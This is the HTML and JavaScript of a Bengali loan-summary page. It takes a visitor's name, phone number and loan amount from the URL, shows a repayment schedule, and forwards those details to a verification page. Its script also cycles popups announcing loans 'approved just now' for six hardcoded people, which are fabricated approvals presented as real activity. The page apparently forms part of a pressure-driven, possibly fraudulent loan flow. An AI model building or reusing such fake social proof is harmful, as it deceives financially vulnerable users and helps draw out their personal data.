<!DOCTYPE html>
<html lang="bn">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>লোনের বিবরণ</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Segoe UI', Roboto, sans-serif; }
        body { 
            background: #0f172a; 
            min-height: 100vh;
            display: flex;
            justify-content: center;
        }
        .container {
            width: 100%;
            max-width: 450px;
            background: #ffffff;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            position: relative;
        }
        .header {
            background: linear-gradient(135deg, #1e3a8a, #3b82f6);
            color: #ffffff;
            padding: 30px 20px 50px;
            text-align: center;
        }
        .header h2 { font-size: 22px; margin-bottom: 6px; }
        .header p { font-size: 13px; opacity: 0.9; }
        .card-wrap {
            margin: -30px 16px 20px;
            background: #ffffff;
            border-radius: 16px;
            box-shadow: 0 8px 25px rgba(0,0,0,0.08);
            padding: 16px;
            flex-grow: 1;
            display: flex;
            flex-direction: column;
        }
        .banner {
            background: linear-gradient(135deg, #1e3a8a, #2563eb);
            border-radius: 12px;
            padding: 18px 10px;
            display: flex;
            justify-content: space-around;
            color: #ffffff;
            text-align: center;
            margin-bottom: 20px;
        }
        .col { flex: 1; }
        .col:not(:last-child) { border-right: 1px solid rgba(255,255,255,0.2); }
        .col span { font-size: 11px; opacity: 0.9; display: block; margin-bottom: 5px; }
        .col strong { font-size: 16px; }
        .schedule-table {
            width: 100%;
            border-collapse: collapse;
            font-size: 13px;
            margin-bottom: 25px;
            border: 1px solid #e2e8f0;
            border-radius: 10px;
            overflow: hidden;
        }
        .schedule-table th {
            background: #f1f5f9;
            color: #475569;
            padding: 10px;
            text-align: left;
        }
        .schedule-table td {
            padding: 12px 10px;
            border-top: 1px solid #e2e8f0;
            color: #1e293b;
        }
        .btn-next {
            margin-top: auto;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 10px;
            padding: 15px;
            background: linear-gradient(135deg, #1e3a8a, #3b82f6);
            color: #ffffff;
            text-decoration: none;
            border-radius: 30px;
            font-weight: bold;
        }

        /* পপআপ নোটিফিকেশন স্টাইল */
        .loan-popup {
            position: fixed;
            bottom: 20px;
            left: 20px;
            background: #ffffff;
            color: #1e293b;
            padding: 12px 16px;
            border-radius: 12px;
            box-shadow: 0 8px 24px rgba(0, 0, 0, 0.15);
            display: flex;
            align-items: center;
            gap: 12px;
            z-index: 9999;
            max-width: 340px;
            border-left: 5px solid #16a34a;
            opacity: 0;
            transform: translateY(30px);
            transition: all 0.5s ease-in-out;
            pointer-events: none;
        }
        .loan-popup.show {
            opacity: 1;
            transform: translateY(0);
            pointer-events: auto;
        }
        .popup-icon {
            width: 38px;
            height: 38px;
            background: #dcfce7;
            color: #16a34a;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 18px;
            flex-shrink: 0;
        }
        .popup-content { display: flex; flex-direction: column; }
        .popup-title { font-size: 13.5px; font-weight: 700; color: #0f172a; margin-bottom: 2px; }
        .popup-desc { font-size: 12px; color: #16a34a; font-weight: 600; }
        .popup-time { font-size: 10px; color: #94a3b8; margin-top: 2px; }
        @media (max-width: 480px) {
            .loan-popup { left: 15px; right: 15px; max-width: none; bottom: 15px; }
        }
    </style>
</head>
<body>

<div class="container">
    <div class="header">
        <h2>লোনের সারাংশ</h2>
        <p>তথ্যগুলো যাচাই করে নিশ্চিত করুন</p>
    </div>

    <div class="card-wrap">
        <div class="banner">
            <div class="col">
                <span>লোন পরিমাণ</span>
                <strong id="dispAmount">৳০</strong>
            </div>
            <div class="col">
                <span>মোট চার্জ/মুনাফা</span>
                <strong id="dispFee">৳০</strong>
            </div>
            <div class="col">
                <span>সর্বমোট দেয়</span>
                <strong id="dispTotal">৳০</strong>
            </div>
        </div>

        <table class="schedule-table">
            <thead>
                <tr>
                    <th>কিস্তি</th>
                    <th>তারিখ</th>
                    <th style="text-align: right;">পরিমাণ</th>
                </tr>
            </thead>
            <tbody id="rows"></tbody>
        </table>

        <a id="nextLink" href="./verify.html" class="btn-next">
            <span>সম্মতি দিন ও এগিয়ে যান</span>
            <i class="fa-solid fa-arrow-right"></i>
        </a>
    </div>
</div>

<!-- নোটিফিকেশন পপআপ কন্টেইনার -->
<div id="loanAlert" class="loan-popup">
    <div class="popup-icon">
        <i class="fa-solid fa-circle-check"></i>
    </div>
    <div class="popup-content">
        <span class="popup-title" id="popName">রহিমা খাতুন (ঢাকা)</span>
        <span class="popup-desc" id="popAmount">৳১০,০০০ লোন অনুমোদিত হয়েছে</span>
        <span class="popup-time" id="popTime">এইমাত্র</span>
    </div>
</div>

<script>
    const params = new URLSearchParams(window.location.search);
    const name = params.get('name') || '';
    const phone = params.get('phone') || '';
    const rawAmount = params.get('amount') || '3000';
    const rawTenure = params.get('tenure') || '3';

    const numAmount = parseInt(rawAmount.replace(/[^0-9]/g, '')) || 3000;
    const numMonths = parseInt(rawTenure.replace(/[^0-9]/g, '')) || 3;

    const fee = Math.round(numAmount * 0.015 * numMonths);
    const total = numAmount + fee;
    const monthly = Math.round(total / numMonths);

    function toBn(num) {
        const bn = ['০', '১', '২', '৩', '৪', '৫', '৬', '৭', '৮', '৯'];
        return num.toString().replace(/[0-9]/g, d => bn[d]);
    }

    document.getElementById('dispAmount').innerText = '৳' + toBn(numAmount.toLocaleString('en-US'));
    document.getElementById('dispFee').innerText = '৳' + toBn(fee.toLocaleString('en-US'));
    document.getElementById('dispTotal').innerText = '৳' + toBn(total.toLocaleString('en-US'));

    const tbody = document.getElementById('rows');
    const today = new Date();
    const months = ["Jan", "Feb", "Mar", "Apr", "May", "Jun", "Jul", "Aug", "Sep", "Oct", "Nov", "Dec"];

    for (let i = 1; i <= numMonths; i++) {
        const d = new Date(today.getFullYear(), today.getMonth() + i, today.getDate());
        tbody.innerHTML += `
            <tr>
                <td>কিস্তি ${toBn(i)}</td>
                <td>${d.getDate()} ${months[d.getMonth()]}, ${d.getFullYear()}</td>
                <td style="text-align: right; font-weight: bold; color: #1e3a8a;">৳${toBn(monthly)}</td>
            </tr>
        `;
    }

    document.getElementById('nextLink').href = `./verify.html?name=${encodeURIComponent(name)}&phone=${encodeURIComponent(phone)}&amount=${encodeURIComponent(rawAmount)}`;

    // পপআপ স্ক্রিপ্ট
    const loanData = [
        { name: "রহিমা খাতুন", district: "ঢাকা", amount: "১০,০০০", time: "এইমাত্র" },
        { name: "আসলাম খান", district: "কুমিল্লা", amount: "২০,০০০", time: "২ মিনিট আগে" },
        { name: "সুমন হোসেন", district: "বগুড়া", amount: "৩০,০০০", time: "১ মিনিট আগে" },
        { name: "ফারজানা আক্তার", district: "চট্টগ্রাম", amount: "১৫,০০০", time: "এইমাত্র" },
        { name: "মোঃ রফিকুল ইসলাম", district: "রাজশাহী", amount: "৫০,০০০", time: "৪ মিনিট আগে" },
        { name: "শারমিন জাহান", district: "সিলেট", amount: "২৫,০০০", time: "৩ মিনিট আগে" }
    ];

    let currentIndex = 0;
    const popupEl = document.getElementById("loanAlert");
    const nameEl = document.getElementById("popName");
    const amountEl = document.getElementById("popAmount");
    const timeEl = document.getElementById("popTime");

    function showNextNotification() {
        const item = loanData[currentIndex];
        nameEl.innerText = `${item.name} (${item.district})`;
        amountEl.innerText = `৳${item.amount} লোন অনুমোদিত হয়েছে`;
        timeEl.innerText = item.time;
        popupEl.classList.add("show");

        setTimeout(() => {
            popupEl.classList.remove("show");
        }, 4000);

        currentIndex = (currentIndex + 1) % loanData.length;
    }

    // পেজ লোডের ২ সেকেন্ড পর শুরু হবে এবং প্রতি ৮ সেকেন্ড অন্তর পরিবর্তন হবে
    setTimeout(() => {
        showNextNotification();
        setInterval(showNextNotification, 8000);
    }, 2000);
</script>

</body>
</html>
